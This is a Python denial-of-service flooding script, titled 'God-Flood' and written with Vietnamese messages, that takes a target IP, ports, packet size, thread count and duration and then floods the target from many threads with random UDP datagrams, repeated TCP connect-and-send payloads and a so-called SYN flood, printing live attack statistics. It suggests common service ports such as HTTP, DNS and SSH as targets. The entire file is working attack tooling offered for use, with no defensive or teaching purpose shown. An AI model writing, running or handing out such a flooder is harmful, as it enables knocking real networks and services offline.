import socket
import random
import threading
import time
import sys
import os

if len(sys.argv) < 6:
    print("God-Flood Tấn công Mạng")
    sys.exit("Cách sử dụng: python " + sys.argv[0] + " <ip> -p <port1>,<port2>,... <size> <threads> <time>\nCác cổng phổ biến:\nHTTP (Web) - 80 (TCP)\nHTTPS (Secure Web) - 443 (TCP)\nDNS - 53 (UDP)\nFTP - 21 (TCP)\nSSH - 22 (TCP)\nSMTP - 25 (TCP)\nMySQL - 3306 (TCP)\nNTP - 123 (UDP)")

ip = sys.argv[1]

if sys.argv[2] == "-p":
    ports_input = sys.argv[3]  
    ports = [int(port) for port in ports_input.split(',')] 
else:
    ports = [int(sys.argv[2])]  

size = int(sys.argv[-3])
threads = int(sys.argv[-2])
run_time = int(sys.argv[-1])  

stop_flag = threading.Event()

success_count = {
    'tcp': 0,
    'udp': 0,
    'syn': 0,
    'total': 0  
}

fail_count = {
    'tcp': 0,
    'udp': 0,
    'syn': 0,
    'total': 0  
}

class Syn(threading.Thread):
    def __init__(self, ip, port, packets):
        super().__init__()
        self.ip = ip
        self.port = port
        self.packets = packets
        self.syn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.syn.setblocking(0) 

    def run(self):
        global success_count, fail_count
        while not stop_flag.is_set():
            try:
               
                self.syn.sendto(b'\x00'*self.packets, (self.ip, self.port))
                success_count['syn'] += 1
                success_count['total'] += 1
            except Exception:
                fail_count['syn'] += 1
                fail_count['total'] += 1
                self.syn.close()

class Tcp(threading.Thread):
    def __init__(self, ip, port, size):
        super().__init__()
        self.ip = ip
        self.port = port
        self.size = size
        self.tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.tcp.setblocking(0)

    def run(self):
        global success_count, fail_count
        while not stop_flag.is_set():
            try:
                
                bytes_data = random._urandom(self.size)
                
                result = self.tcp.connect_ex((self.ip, self.port))  
                
                if result == 0: 
                    self.tcp.send(bytes_data)  
                    success_count['tcp'] += 1
                    success_count['total'] += 1
                else:
                    fail_count['tcp'] += 1
                    fail_count['total'] += 1
            except Exception as e:
                fail_count['tcp'] += 1
                fail_count['total'] += 1
                self.tcp.close()

class Udp(threading.Thread):
    def __init__(self, ip, port, size):
        super().__init__()
        self.ip = ip
        self.port = port
        self.size = size
        self.udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def run(self):
        global success_count, fail_count
        while not stop_flag.is_set():
            try:
                bytes_data = random._urandom(self.size)
                if self.port == 0:
                    self.port = random.randrange(1, 65535)
                self.udp.sendto(bytes_data, (self.ip, self.port))
                success_count['udp'] += 1
                success_count['total'] += 1
            except:
                fail_count['udp'] += 1
                fail_count['total'] += 1

def print_stats():
    os.system('clear')  
    print(f"\n--- Thống kê ---")
    print(f"SYN - Thành công: {success_count['syn']} | Thất bại: {fail_count['syn']}")
    print(f"TCP - Thành công: {success_count['tcp']} | Thất bại: {fail_count['tcp']}")
    print(f"UDP - Thành công: {success_count['udp']} | Thất bại: {fail_count['udp']}")
    print(f"Tổng cộng - Thành công: {success_count['total']} | Thất bại: {fail_count['total']}")
    print("\nĐang tấn công...")

def start_attack():
    threads_list = []
    
    
    for port in ports:
        for _ in range(threads):
            udp_thread = Udp(ip, port, size)
            tcp_thread = Tcp(ip, port, size)
            syn_thread = Syn(ip, port, size)

            udp_thread.start()
            tcp_thread.start()
            syn_thread.start()

            threads_list.append(udp_thread)
            threads_list.append(tcp_thread)
            threads_list.append(syn_thread)

    start_time = time.time()
    while time.time() - start_time < run_time:
        print_stats()
        time.sleep(1)

    stop_flag.set()
    for thread in threads_list:
        thread.join()

def print_final_stats():
    print(f"\n--- Tổng kết tấn công ---")
    print(f"SYN - Thành công: {success_count['syn']} | Thất bại: {fail_count['syn']}")
    print(f"TCP - Thành công: {success_count['tcp']} | Thất bại: {fail_count['tcp']}")
    print(f"UDP - Thành công: {success_count['udp']} | Thất bại: {fail_count['udp']}")
    print(f"Tổng cộng - Thành công: {success_count['total']} | Thất bại: {fail_count['total']}")
    print("\nHoàn thành tấn công.")

try:
    print(f"Bắt đầu tấn công IP {ip}, các cổng {ports}, thời gian {run_time} giây với {threads} luồng...")
    start_attack()
    print_final_stats()
except KeyboardInterrupt:
    print("Dừng tấn công!")
    stop_flag.set()
    sys.exit()
except socket.error as msg:
    print(f"Lỗi socket: {msg}")
    sys.exit()